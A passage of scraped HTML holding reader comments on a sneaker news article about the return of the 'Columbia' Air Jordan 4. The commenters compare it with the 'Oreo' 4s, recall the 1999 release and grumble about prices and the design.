    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="http://avatars.fyre.co/a/25/1f977d15b822e1070e3b8bbd41d30b5d/50.jpg?v=1392715180" class=
    "fyre-user-avatar" alt="HiddenUzumaki" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">HiddenUzumaki</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><a vocab="http://schema.org" typeof="Person" rel="nofollow" resource="acct:16180874" data-lf-handle="" data-lf-provider="twitter" property="url" href="https://twitter.com/#!/sneakernews" target="_blank" class="fyre-mention fyre-mention-twitter external">@<span property="name">sneakernews</span></a> enlisting right now</p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="http://avatars.fyre.co/a/25/7d159699351ab62a52c23a9f268a99c7/50.jpg?v=1402037096" class=
    "fyre-user-avatar" alt="sshort13" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">sshort13</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><a vocab="http://schema.org" typeof="Person" rel="nofollow" resource="acct:16180874" data-lf-handle="" data-lf-provider="twitter" property="url" href="https://twitter.com/#!/sneakernews" target="_blank" class="fyre-mention fyre-mention-twitter external">@<span property="name">sneakernews</span></a> <a vocab="http://schema.org" typeof="Person" rel="nofollow" resource="acct:38851769" data-lf-handle="" data-lf-provider="twitter" property="url" href="https://twitter.com/#!/NottsTopBoy" target="_blank" class="fyre-mention fyre-mention-twitter external">@<span property="name">NottsTopBoy</span></a></p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="http://avatars.fyre.co/a/25/8040084954d6a6625428eb8ec7f597e0/50.jpg?v=1402035862" class=
    "fyre-user-avatar" alt="ruckdab" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">ruckdab</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><a vocab="http://schema.org" typeof="Person" rel="nofollow" resource="acct:16180874" data-lf-handle="" data-lf-provider="twitter" property="url" href="https://twitter.com/#!/sneakernews" target="_blank" class="fyre-mention fyre-mention-twitter external">@<span property="name">sneakernews</span></a> </p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="http://avatars.fyre.co/a/26/ad451cc17cb1f9acdab89aded3f9dec2/50.jpg?v=1402083332" class=
    "fyre-user-avatar" alt="Filip Krawczyński" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">Filip Krawczyński</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><p>Petros Bekiaris</p></p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="http://avatars.fyre.co/a/25/40396883c028ee912ffb1f95c4c0e617/50.jpg?v=1415857761" class=
    "fyre-user-avatar" alt="Aus_B3" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">Aus_B3</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><a vocab="http://schema.org" typeof="Person" rel="nofollow" resource="acct:16180874" data-lf-handle="" data-lf-provider="twitter" property="url" href="https://twitter.com/#!/sneakernews" target="_blank" class="fyre-mention fyre-mention-twitter external">@<span property="name">sneakernews</span></a>ews: "Columbia" Jordan 4s for next year, get rea<a href="http://t.co/lN5TtAySyV" target="_blank" rel="nofollow" class="external">dlvr.it/5v6PH4</a>S<a href="http://t.co/IEtkddhZR7" target="_blank" rel="nofollow" class="external">pic.twitter.com/IEtkddhZR7</a>ZR7”</p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="http://avatars.fyre.co/a/26/ebcf00481199e1f5e36768b95e274538/50.jpg?v=1406163251" class=
    "fyre-user-avatar" alt="Sergio Rodriguez" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">Sergio Rodriguez</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><p>Santino Gonzalez</p></p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="https://secure.gravatar.com/avatar/a1536373fa3491acbbe31615ff103e95/?s=50&amp;d=https://lfavatar-a.akamaihd.net/a/anon/50.jpg" class=
    "fyre-user-avatar" alt="sneaker freak" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">sneaker freak</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><p>Just imagine if they released these in a pack with the oreo's people really would go crazy</p></p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="http://avatars.fyre.co/a/26/8efee940db1ef6a62ff38edf8a9c05cb/50.jpg?v=1402020212" class=
    "fyre-user-avatar" alt="Vincent Phan" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">Vincent Phan</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><p>Elias Magin danke basedgod</p></p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="https://lfavatar-a.akamaihd.net/a/25/8d583631ae98e8c26f8396576c340285/50.jpg?v=1419275626" class=
    "fyre-user-avatar" alt="stanley_yz" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">stanley_yz</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><a vocab="http://schema.org" typeof="Person" rel="nofollow" resource="acct:16180874" data-lf-handle="" data-lf-provider="twitter" property="url" href="https://twitter.com/#!/sneakernews" target="_blank" class="fyre-mention fyre-mention-twitter external">@<span property="name">sneakernews</span></a> <a vocab="http://schema.org" typeof="Person" rel="nofollow" resource="acct:304607983" data-lf-handle="" data-lf-provider="twitter" property="url" href="https://twitter.com/#!/damnimballin" target="_blank" class="fyre-mention fyre-mention-twitter external">@<span property="name">damnimballin</span></a> cleann</p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="http://avatars.fyre.co/a/1/e222e9a3c60ab0e1e0f0942b0f86a415/50.jpg?v=1398709990" class=
    "fyre-user-avatar" alt="Iseeulookin973" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">Iseeulookin973</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><p>Both these and the oreo 4s are dope most definitely will have these two sitting on top of one another in my stash! Instacop, Robocop!</p></p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="https://secure.gravatar.com/avatar/f64bca83f30c74368b84dd5cddd498a8/?s=50&amp;d=https://lfavatar-a.akamaihd.net/a/anon/50.jpg" class=
    "fyre-user-avatar" alt="JFresh_136" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">JFresh_136</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><p>I feel like they should've dropped these and the Oreos during the year of the 4s, but I guess it's never too late.</p></p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="https://lfavatar-a.akamaihd.net/a/26/90f762f966896ae664fc059a8d84c7c8/50.jpg?v=1418661695" class=
    "fyre-user-avatar" alt="Christopher Gregory" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">Christopher Gregory</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><p>Who requested that these re-release ? SMDH at a failed, pointless, and ugly retro!</p></p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="https://lfavatar-a.akamaihd.net/a/26/ebac001dac2c362da09dbcf95719cfed/50.jpg?v=1417900597" class=
    "fyre-user-avatar" alt="Luka Kasalovic" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">Luka Kasalovic</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><p>^ I agree Matt Grossmann</p></p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="http://avatars.fyre.co/a/26/97b04edebc3a073325e7d1d27c7af879/50.jpg?v=1412215252" class=
    "fyre-user-avatar" alt="Matt Grossmann" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">Matt Grossmann</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><p>Luka Kasalovic I might be visually impaired but I don't like these or the Oreos lol I'll stick with the bred 4s</p></p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="https://lfavatar-a.akamaihd.net/a/26/ebac001dac2c362da09dbcf95719cfed/50.jpg?v=1417900597" class=
    "fyre-user-avatar" alt="Luka Kasalovic" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">Luka Kasalovic</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><p>Matt Grossmann</p></p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="https://secure.gravatar.com/avatar/a1536373fa3491acbbe31615ff103e95/?s=50&amp;d=https://lfavatar-a.akamaihd.net/a/anon/50.jpg" class=
    "fyre-user-avatar" alt="sneaker freak" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">sneaker freak</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><p>I remember when these first came out they sat on racks easy cop if you wanted them back in 99 but everybody is going to go crazy for these when they come out next year I hope they drop the mocha 3's soon I might try for these though dope shoe</p></p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="https://secure.gravatar.com/avatar/e9826e3374367f92bd55460cacc58c8d/?s=50&amp;d=https://lfavatar-a.akamaihd.net/a/anon/50.jpg" class=
    "fyre-user-avatar" alt="Staxx13" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">Staxx13</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><p>$89.99 i remember that price tag, i bet that was 1989 price was about the same. But $160 plus 15 years later because everyone and they grandma are sneakerheads now. Pass! Great shoe though</p></p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="http://avatars.fyre.co/a/26/76b183983be33cc1eb9e6e23888cd789/50.jpg?v=1417208468" class=
    "fyre-user-avatar" alt="Jesus Moises Gonzalez" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">Jesus Moises Gonzalez</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><p>Symone Aiesha Rachael Evans</p></p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="https://secure.gravatar.com/avatar/9af439bae55be87eb0d86dd4eb6664f7/?s=50&amp;d=https://lfavatar-a.akamaihd.net/a/anon/50.jpg" class=
    "fyre-user-avatar" alt="weldonmiguel" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">weldonmiguel</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><p>Oreos and Columbias are the 2best IVs EVER! The quality is beyond good! The tumbled leather is about as good as it gets! I remember when I bought these back in 99 I couldn't believe how plush the leather was.I love Tue Leather strap instead of the plastic crap.</p></p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="https://lfavatar-a.akamaihd.net/a/1/aff99f693a1e16e772e4a1b86ea6976b/50.jpg?v=1395958237" class=
    "fyre-user-avatar" alt="JMBasquiat " /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">JMBasquiat </a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><p><span>I wonder if Nike will add the netting or nah.</span></p></p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="https://lfavatar-a.akamaihd.net/a/1/aff99f693a1e16e772e4a1b86ea6976b/50.jpg?v=1395958237" class=
    "fyre-user-avatar" alt="JMBasquiat " /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">JMBasquiat </a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><p>I had a feeling Nike was going to release some 4s later this year or next year. </p></p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="http://avatars.fyre.co/a/26/fc265b305aedcd7aca37efd0c13efacd/50.jpg?v=1403810329" class=
    "fyre-user-avatar" alt="Jay Brooks" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">Jay Brooks</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><p>Feels like I'm in high school again</p></p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="http://avatars.fyre.co/a/1/67548be958868679803cb62f5227dd40/50.jpg?v=1401216151" class=
    "fyre-user-avatar" alt="Da_Real_Big_Infinite" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">Da_Real_Big_Infinite</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><p>I like da Oreo 4s over these. But these will be copped. Sold mine at a sneaker con yrs ago</p></p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="http://avatars.fyre.co/a/25/1ef519ae2bdb6394076cdfd4a2d954c8/50.jpg?v=1401941669" class=
    "fyre-user-avatar" alt="Royalty_Devon" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">Royalty_Devon</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><a vocab="http://schema.org" typeof="Person" rel="nofollow" resource="acct:770348012" data-lf-handle="" data-lf-provider="twitter" property="url" href="https://twitter.com/#!/tyroneblank_" target="_blank" class="fyre-mention fyre-mention-twitter external">@<span property="name">tyroneblank_</span></a> <a vocab="http://schema.org" typeof="Person" rel="nofollow" resource="acct:16180874" data-lf-handle="" data-lf-provider="twitter" property="url" href="https://twitter.com/#!/sneakernews" target="_blank" class="fyre-mention fyre-mention-twitter external">@<span property="name">sneakernews</span></a> no ! 4s without the side netting needa stay in the past, they classic.</p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="http://avatars.fyre.co/a/25/e38c87212a7f8aaf3bcaef264b859a3a/50.jpg?v=1401933465" class=
    "fyre-user-avatar" alt="MikeBeezy42" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">MikeBeezy42</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p>“<a vocab="http://schema.org" typeof="Person" rel="nofollow" resource="acct:16180874" data-lf-handle="" data-lf-provider="twitter" property="url" href="https://twitter.com/#!/sneakernews" target="_blank" class="fyre-mention fyre-mention-twitter external">@<span property="name">sneakernews</span></a>: "Columbia" Jordan 4s are coming back <a href="http://t.co/rS2MRpPDu5" target="_blank" rel="nofollow" class="external">dlvr.it/5tTZmb</a> <a href="http://t.co/x9vwh219Zm" target="_blank" rel="nofollow" class="external">pic.twitter.com/x9vwh219Zm</a>”</p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
    <a class="fyre-comment-author"><img src="https://lfavatar-a.akamaihd.net/a/26/853b778a380aa49c1edb77055631c92d/50.jpg?v=1418701486" class=
    "fyre-user-avatar" alt="Brian Six Pahler" /></a>

    <div class="fyre-comment-socialsync fyre-comment-from-livefyre"></div>
  </div>
    
  <header class="fyre-comment-head">
    <a class="fyre-comment-username">Brian Six Pahler</a> 
    
    
    <span class="fyre-comment-user-rating" style="display: none;">5pts</span>
    <span class="fyre-comment-like" style="float: right;">
      
    </span>
    
  </header>
  
  <section class="fyre-comment-body">
    <div class="fyre-comment">
      <p><p>Ugly the design and holes on side ruin it</p></p>
    </div>
    
  </section>

  <footer class="fyre-comment-footer">
  </footer>
  </div>
  <div class="fyre-comment-divider"><div class="fyre-comment-divider"></div></div>

  
    
  <div class="fyre-comment-replies fyre-comment-container fyre-comment-replies-indent">
  
  </div>
</article>


        
            
<article class="fyre-comment-article">
  <div class="fyre-comment-wrapper">
  
  
  
  <div class="fyre-comment-user">
